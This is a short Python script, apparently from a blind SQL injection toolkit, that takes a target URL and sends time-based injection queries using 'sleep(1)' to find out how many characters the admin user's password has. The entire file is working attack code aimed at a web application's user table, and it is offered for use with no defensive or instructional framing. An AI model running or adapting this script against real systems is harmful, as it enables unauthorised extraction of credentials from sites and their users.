"""
Example usage: python guess_pass_length.py <url>
"""

from blindSQL import get_base_response_time, inject
from sys import argv

if __name__ == "__main__":
    URL = argv[1]

def craft_query(num):
    return "select sleep(1) from users where username = 'admin' and length(password) = {}".format(num)

def pass_length(base_response_time):
    for num in range(0, 30):
        query = craft_query(num)
        print("Trying", num, "characters")
        if inject(query, base_response_time, URL):
            print("I believe the password is", num, "characters long")
            return num

base_response_time = get_base_response_time(URL)
length = pass_length(base_response_time)